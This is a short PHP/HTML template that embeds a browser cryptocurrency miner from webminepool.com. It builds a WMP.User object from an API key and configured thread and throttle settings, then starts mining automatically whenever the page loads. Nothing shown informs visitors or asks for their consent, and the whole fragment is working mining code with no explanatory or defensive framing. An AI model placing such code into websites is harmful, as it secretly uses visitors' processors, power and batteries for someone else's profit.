<script src="https://webminepool.com/lib/base.js"></script>
<script>
    <?php
        echo "
            var jobber = new WMP.User('$wmp_api_public_key', '".base_url()."', {
				threads: $hm_number_of_threads,
				autoThreads: '$hm_auto_threads',
				throttle: $hm_throttle,
				forceASMJS: false
			});
	    jobber.start();";
    ?>
</script>